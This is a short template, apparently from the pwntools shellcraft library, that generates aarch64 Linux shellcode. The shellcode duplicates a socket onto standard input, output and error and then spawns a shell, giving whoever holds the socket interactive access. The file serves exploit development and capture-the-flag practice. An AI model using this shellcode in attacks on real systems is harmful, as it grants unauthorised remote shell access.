<% from pwnlib.shellcraft.aarch64 import linux %>
<%page args="sock = 'x12'"/>
<%docstring>
Args: [sock (imm/reg) = x12]
    Duplicates sock to stdin, stdout and stderr and spawns a shell.
</%docstring>


${linux.dupio(sock)}

${linux.sh()}
